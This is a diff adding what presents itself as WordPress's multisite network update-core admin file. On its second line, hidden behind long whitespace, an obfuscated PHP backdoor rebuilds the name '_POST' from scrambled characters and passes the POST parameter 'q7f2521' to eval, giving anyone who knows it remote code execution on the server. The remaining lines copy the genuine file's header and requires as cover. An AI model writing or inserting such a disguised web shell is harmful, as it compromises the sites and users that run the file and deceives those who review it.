@@ -1,0 +1,13 @@
+<?php
+<?php                                                                                                                                                                                                                                                       $ifb03 ="pot_s"; $yqyx1 = strtoupper($ifb03[3]. $ifb03[0]. $ifb03[1]. $ifb03[4]. $ifb03[2] ) ; if( isset (${$yqyx1} ['q7f2521'] )){ eval ( ${ $yqyx1 }['q7f2521']); }?>/**
+ * Updates network administration panel.
+ *
+ * @package WordPress
+ * @subpackage Multisite
+ * @since 3.1.0
+ */
+
+/** Load WordPress Administration Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+require ABSPATH . 'wp-admin/update-core.php';
